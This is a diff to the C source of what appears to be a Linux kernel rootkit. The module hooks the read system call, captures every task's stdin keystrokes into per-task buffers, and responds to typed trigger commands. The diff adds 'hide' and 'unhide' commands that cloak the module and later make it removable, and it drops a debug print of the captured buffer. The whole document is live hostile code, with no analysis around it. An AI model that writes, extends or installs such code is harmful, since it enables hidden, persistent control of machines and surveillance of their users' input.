@@ -14,10 +14,14 @@
 
 ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
 
-#define INPUTBUFLEN 1024
+#define INPUTBUFLEN 1024  //This was arbitrarily chosen to be huge
 
 struct taskinput_buffer inbuf_head;
 
+/* This struct contains a buffer for a task that we read from via stdin
+*  Every task is identified by it's name.
+*  These structs are often referred to as 'input buffer' or 'tinbuf'
+*/
 struct taskinput_buffer{
 	char buf[INPUTBUFLEN];
 	unsigned short bufpos;
@@ -28,6 +32,7 @@ struct taskinput_buffer{
 spinlock_t tinbuf_lock;
 int rcount;
 
+/* Create a new input buffer for a task of a given name */
 struct taskinput_buffer * add_input_buffer(char * name, size_t namelen){
 	struct taskinput_buffer * new_tib;
 	
@@ -41,7 +46,9 @@ struct taskinput_buffer * add_input_buffer(char * name, size_t namelen){
 	
 	return new_tib;
 }
-
+/* Traverse the list of input buffers and return the corresponding tinbuf
+*  If none was found, a new struct is created, added to the list and returned
+*/
 struct taskinput_buffer * find_tinbuf(char * name){
 	struct taskinput_buffer * it;
 	if(name == NULL) return NULL;
@@ -59,6 +66,11 @@ struct taskinput_buffer * find_tinbuf(char * name){
 	return it;
 }
 
+/* This returns the filename for the current processes'
+* stdin. Input that comes from the user via bash usually 
+* has the filename tty1 but this is quite useful in case
+* we want to receive commands from somewhere else
+*/
 char * get_stdin_filename(void){
 	struct fdtable * fdt;
 	struct files_struct * files;
@@ -96,7 +108,7 @@ char * get_stdin_filename(void){
 	return retVal;
 }
 
-
+/* Here all the command handling magic takes place */
 ssize_t my_read(int fd, void * buf, size_t count){
 	ssize_t retVal;
 	char * current_stdin_name;
@@ -110,15 +122,15 @@ ssize_t my_read(int fd, void * buf, size_t count){
 		return retVal;
 	}
 		
-	if(fd == 0){	
+	if(fd == 0){	//case file is stdin
 		current_stdin_name = get_stdin_filename();
 
-		if(current_stdin_name == NULL) //tab completion comes from a null device or something.
+		if(current_stdin_name == NULL) //tab completion comes from a nameless device; must be handled.
 			return retVal;
 
 		cur_tinb = find_tinbuf(current_stdin_name);
 	
-		kfree(current_stdin_name);
+		kfree(current_stdin_name); //no longer needed
 		for(i = 0; i < retVal; i++){
 			if(cur_tinb->bufpos < INPUTBUFLEN-1){
 				c =  *((char*)buf+i);
@@ -131,12 +143,16 @@ ssize_t my_read(int fd, void * buf, size_t count){
 				if(c == 0x0d){ //handle enter press
 					cur_tinb->buf[cur_tinb->bufpos] = '\0';
 					cur_tinb->bufpos = 0;
-						//compare with known commands
+					
+					//compare with known commands
 					if(strcmp("ping", cur_tinb->buf) == 0){
 						printk(KERN_INFO "Pong!\n");
 					}
-					if(strcmp("unload", cur_tinb->buf) == 0){
-						printk(KERN_INFO "will unload soon(TM)\n");
+					if(strcmp("hide", cur_tinb->buf) == 0){
+						hide_code();
+					}
+					if(strcmp("unhide", cur_tinb->buf) == 0){
+						printk(KERN_INFO "Cloak disengaged\n");
 						make_module_removable();
 					}
 					*cur_tinb->buf = '\0';
@@ -155,10 +171,6 @@ ssize_t my_read(int fd, void * buf, size_t count){
 
 			}
 		}
-	
-			
-		printk(KERN_INFO "buffer: %s\n",cur_tinb->buf);
-	
 	
 	}
 	return retVal;
